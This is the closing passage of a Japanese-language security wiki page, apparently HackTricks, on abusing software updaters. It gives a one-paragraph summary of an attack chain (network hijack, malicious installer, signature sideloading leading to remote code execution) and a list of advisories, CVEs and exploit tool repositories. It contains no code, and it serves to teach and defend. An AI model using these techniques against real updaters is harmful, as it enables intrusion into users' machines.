これらのパターンは、署名されていないマニフェストを受け入れる、またはインストーラーの署名者を固定しないあらゆるアップデーターに当てはまります。ネットワークの乗っ取り + 悪意あるインストーラー + BYO署名によるサイドローディングにより、「信頼された」更新を装ったリモートコード実行が可能になります。

---
## References
- [1] [アドバイザリ – Netskope Client for Windows – 不正サーバー経由のローカル権限昇格 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope セキュリティアドバイザリ NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope プラグイン](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC クライアント/エクスプロイト](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4のPwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agentの書き込み可能なファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windowsエージェントの権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家支援型アクターによるNotepad++サプライチェーンの悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – インフラ乗っ取りインシデントの更新情報](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for WindowsのCVE-2025-0309修正をバイパスする](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantageの権限昇格バグを発見](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPCからSYSTEMへ](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
